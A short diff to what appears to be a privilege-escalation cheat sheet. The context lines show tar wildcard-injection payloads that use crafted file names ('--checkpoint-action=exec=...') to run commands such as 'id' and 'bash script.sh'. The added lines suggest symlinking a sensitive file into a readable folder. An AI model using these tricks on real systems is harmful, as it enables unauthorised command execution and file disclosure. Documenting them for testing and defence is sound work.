@@ -96,6 +96,12 @@ $ touch './--checkpoint-action=exec="id > id.txt"'
 $ touch './--checkpoint-action=exec=id > id.txt'
 $ touch './--checkpoint-action=exec=bash script.sh'
 ```
+
+If you can read files only in a specific folder or having a specific name, you can try using symbolic links:
+
+```ps
+$ ln -s /path/to/juicy/file /tmp/script/res/file
+```
 </div></div>
 
 <hr class="sep-both">
